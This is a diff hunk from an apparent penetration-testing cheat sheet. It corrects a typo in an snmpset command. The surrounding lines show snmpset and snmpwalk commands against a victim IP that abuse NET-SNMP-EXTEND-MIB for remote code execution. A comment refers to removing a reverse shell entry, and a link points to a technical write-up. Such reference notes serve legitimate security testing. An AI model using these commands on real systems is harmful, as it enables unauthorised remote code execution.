@@ -799,7 +799,7 @@ snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp
 snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects
 
 # delete the reverse shell command from the SNMP table
-snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c privagte $VICTIM_IP 'nsExtendStatus."derp"' = destroy
+snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = destroy
 ```
 
 This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)
